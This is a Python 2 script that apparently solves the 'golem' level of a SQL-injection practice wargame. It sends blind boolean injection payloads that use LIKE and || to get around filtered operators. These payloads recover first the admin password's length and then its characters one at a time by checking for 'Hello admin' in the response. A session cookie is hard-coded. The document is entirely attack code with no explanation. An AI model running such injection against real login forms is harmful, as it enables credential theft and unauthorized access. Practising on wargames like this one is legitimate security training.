import requests
cooki = {'PHPSESSID': "70n919pvoci31ggq3bqa5i3mp0"}
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "'||length(pw) like '"+str(i)+"'#"}
    res = requests.get(url, params, cookies=cooki)
    #print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "' || id like 'admin' && ascii(left(right(pw,"+str(j)+"),1)) like "+str(k)+"#"}
        res2 = requests.get(url, params, cookies=cooki)

        if key in res2.text:
            print str(j) + " : " + chr(k)
